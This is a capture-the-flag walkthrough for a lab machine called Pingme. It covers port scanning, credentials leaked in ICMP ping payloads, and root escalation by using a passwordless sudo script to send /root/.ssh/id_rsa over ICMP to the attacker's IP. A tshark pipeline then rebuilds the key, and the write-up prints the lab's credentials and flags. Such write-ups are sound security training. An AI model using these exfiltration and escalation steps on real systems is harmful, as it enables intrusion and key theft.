+++
title = "Pingme - Walkthrough"
date = "2026-07-11"
author = "nvru"
description = "Walkthrough for the Pingme machine."
tags = [
  "ctf",
  "walkthrough",
  "linux",
  "http",
  "icmp",
  "credential-disclosure",
  "traffic-analysis",
  "sudo",
  "privilege-escalation",
  "medium",
]
draft = false
+++

# Overview

- **Attacker IP:** `10.10.10.2`
- **Target Machine IP:** `10.10.10.21`

The objective was to enumerate the target, identify exposed services, gain initial access by recovering credentials leaked through ICMP packets, and escalate privileges by abusing a root-owned script that allowed arbitrary file transmission over ICMP.

![Machine information](/images/hmv/pingme/vm.png)

---

## Port Scanning

### RustScan

```bash
rustscan -a 10.10.10.21 -- -sC -sV -A -oA nmap/rust
```

#### Results

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
80/tcp open  http    nginx 1.18.0

Service Info: OS: Linux
```

Only SSH and HTTP were exposed. Since SSH did not provide an entry point yet, I started with web enumeration.

---

## Enumeration

### Web Enumeration

Browsing to port **80** revealed a very simple web page that immediately pinged my machine. There was no input field or any functionality to interact with; it simply displayed the ping output.

![Ping page](/images/hmv/pingme/http.png)

The page source also didn't reveal anything useful, so I moved on to inspecting the network traffic.

To verify what was happening, I captured the ICMP traffic on my machine using:

```bash
tcpdump -ni any "icmp[0] == 8"
```

The web application was indeed sending ICMP Echo Requests to my machine.

Since the application communicated through ICMP, I focused on inspecting the packet payload rather than the HTTP response.

---

### Capturing ICMP Packets

While inspecting the captured packets, I noticed that the ICMP payload contained more than just the standard ping data. The application was leaking information inside the packet payload.

The first packets revealed the username:

![ICMP username](/images/hmv/pingme/user_icmp.png)

Subsequent packets revealed the password:

![ICMP password](/images/hmv/pingme/passwd_icmp.png)

Recovered credentials:

```text
Username: pinger
Password: P!ngM3
```

Since SSH was the only other exposed service, I used the recovered credentials to authenticate successfully.

---

## Privilege Escalation

### pinger → root

After logging in, I checked the home directory. Besides the user flag, nothing particularly interesting was present.

The next step was checking sudo permissions.

```bash
sudo -l
```

![sudo permissions](/images/hmv/pingme/sudo_perm.png)

The `pinger` user could execute:

```text
/usr/local/sbin/sendfileping
```

as **root** without supplying a password.

I first checked whether the script itself was writable, but it wasn't.

```bash
ls -l /usr/local/sbin/sendfileping
```

![Script permissions](/images/hmv/pingme/src_perm.png)

Inspecting the file showed that it was a Bash script accepting two arguments:

- Destination IP
- File to transmit

![Script Code](/images/hmv/pingme/src_send.png)

Since the script could read arbitrary files as root, I used it to send `/root/.ssh/id_rsa` to my machine. The file was transmitted through ICMP packets, which I captured and reconstructed.

On my machine, I captured and reconstructed the transmitted packets using:

```bash
tshark -i vboxnet0 \
-f "src 10.10.10.21 and icmp" \
-c 2602 -x |
grep "^0060" |
awk '{print $NF}' |
cut -c2 |
xargs |
sed "s/ //g" |
sed "s/\./\n/g" |
tee root_rsa
```

Command breakdown:

- `-i vboxnet0` captures traffic on the VirtualBox Host-Only interface.
- `-f` limits the capture to ICMP packets from the target.
- `-c 2602` captures enough packets to reconstruct the transmitted file.
- `-x` prints packet contents in hexadecimal and ASCII format.
- `grep` and `awk` extract the relevant ASCII data from each packet.
- `xargs` joins everything into one line.
- The first `sed` removes spaces.
- The second `sed` restores the original line structure by replacing `.` characters with newlines.
- `tee` saves the recovered key.

The reconstructed key looked like:

![Recovered root key](/images/hmv/pingme/root_rsa.png)

The reconstructed key required one final manual adjustment. The header and footer appeared as:

```text
-----BEGIN0OPENSSH0PRIVATE0KEY-----
...
-----END0OPENSSH0PRIVATE0KEY-----
```

Replace the `0` characters with spaces:

```text
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
```

After fixing the key, I changed its permissions and authenticated as root:

```bash
chmod 600 root_rsa
ssh -i root_rsa root@10.10.10.21
```

![Root shell](/images/hmv/pingme/ssh_root.png)

The same technique can also be used to retrieve the root flag directly. Instead of supplying `/root/.ssh/id_rsa`, `/root/root.txt` can be provided as the file argument and reconstructed from the captured ICMP traffic.

![Root flag extraction](/images/hmv/pingme/root_flag.png)

---

## Credentials

```text
pinger:P!ngM3
```

---

## Flags

```text
user:HMV{ICMPisSafe}

root:HMV{ICMPcanBeAbused}
```
